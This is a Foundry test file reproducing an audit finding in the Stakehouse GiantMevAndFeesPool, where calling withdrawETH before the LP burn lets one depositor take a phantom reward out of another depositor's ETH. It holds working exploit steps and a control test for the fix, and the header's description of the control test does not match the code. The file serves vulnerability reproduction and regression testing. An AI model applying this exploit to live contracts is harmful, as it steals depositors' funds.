// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./43031-h-08-function-withdraweth-from-giantmevandfeespool-can-steal.sol";

/*//////////////////////////////////////////////////////////////
    Stakehouse Protocol — withdrawETH from GiantMevAndFeesPool can steal
    most of the ETH because idleETH is reduced before burning the LP token
    (H-08, #43031)

    GiantPoolBase.withdrawETH does `idleETH -= _amount` BEFORE
    `lpTokenETH.burn(...)`. Burning triggers the reward-accrual hook, whose
    totalRewardsReceived() formula subtracts idleETH — since idleETH was
    already reduced, the formula reports a phantom "reward" equal to the
    withdrawn amount, which gets paid out to the withdrawer on top of their
    own principal, funded from other depositors' share of the pool.

    - test_exploit: drives the cheatcode-free Exploit end to end (depositors
      pre-funded like vm.deal, matching the Playground's unrecorded setup
      step), then re-asserts the theft from the driver.
    - test_stealFromOtherDepositor: standalone rebuild with EOAs mirroring the
      finding's own PoC (two depositors, one withdraws once).
    - test_control_singleDepositorWithdrawIsFair: control — a LONE depositor
      (no shared pool) withdraws their own funds and gets back EXACTLY their
      principal, isolating the multi-depositor idleETH ordering as the
      defect, not withdrawETH in general.
//////////////////////////////////////////////////////////////*/
contract GiantPoolRewardTheftTest is Test {
    /// @notice HARM via the self-contained Exploit: userB extracts more ETH
    ///         than they deposited, at userA's expense.
    function test_exploit() public {
        Exploit e = new Exploit();
        uint256 depositAmount = e.DEPOSIT_AMOUNT();

        // Pre-fund the depositors exactly like the Playground's unrecorded
        // setup step (mirrors vm.deal) — happens BEFORE run().
        vm.deal(address(e.userA()), depositAmount);
        vm.deal(address(e.userB()), depositAmount);

        e.run();

        GiantMevAndFeesPool pool = e.pool();
        Depositor userA = e.userA();
        Depositor userB = e.userB();

        // Re-assert the HARM independently from the driver.
        assertGt(address(userB).balance, depositAmount, "userB profited beyond their own principal");
        assertEq(address(userB).balance, 6 ether, "userB extracted exactly 2 ETH more than their 4 ETH principal");
        assertLt(address(pool).balance, depositAmount, "pool cannot fully cover userA's remaining 4 ETH claim");
        assertEq(pool.lpTokenETH().balanceOf(address(userA)), depositAmount, "userA's claim is untouched but now under-collateralized");
    }

    /// @notice Standalone rebuild mirroring the finding's own PoC: two
    ///         depositors, one withdraws once and steals from the other.
    function test_stealFromOtherDepositor() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();

        address userOne = makeAddr("feesAndMevUserOne");
        address userTwo = makeAddr("feesAndMevUserTwo");
        vm.deal(userOne, 4 ether);
        vm.deal(userTwo, 4 ether);

        vm.prank(userOne);
        pool.depositETH{value: 4 ether}(4 ether);

        vm.startPrank(userTwo);
        pool.depositETH{value: 4 ether}(4 ether);
        pool.withdrawETH(4 ether);
        vm.stopPrank();

        assertEq(userOne.balance, 0, "userOne never withdrew");
        assertEq(userTwo.balance, 6 ether, "userTwo (attacker) walks away with 6 ETH for a 4 ETH deposit");
        assertEq(address(pool).balance, 2 ether, "pool only has 2 ETH left to cover userOne's 4 ETH claim");
    }

    /// @notice Control: with the report's recommended fix applied (burn
    ///         BEFORE decrementing idleETH), a depositor withdrawing their own
    ///         funds gets back EXACTLY their principal — isolating the
    ///         idleETH-before-burn ORDER as the defect, not withdrawETH or the
    ///         reward-accrual hook in general.
    function test_control_fixedOrderWithdrawIsFair() public {
        GiantMevAndFeesPoolFixed pool = new GiantMevAndFeesPoolFixed();

        address userOne = makeAddr("feesAndMevUserOneFixed");
        address userTwo = makeAddr("feesAndMevUserTwoFixed");
        vm.deal(userOne, 4 ether);
        vm.deal(userTwo, 4 ether);

        vm.prank(userOne);
        pool.depositETH{value: 4 ether}(4 ether);

        vm.startPrank(userTwo);
        pool.depositETH{value: 4 ether}(4 ether);
        pool.withdrawETH(4 ether);
        vm.stopPrank();

        assertEq(userTwo.balance, 4 ether, "with the fix, userTwo gets back exactly their own principal");
        assertEq(address(pool).balance, 4 ether, "pool still fully covers userOne's untouched claim");
    }
}
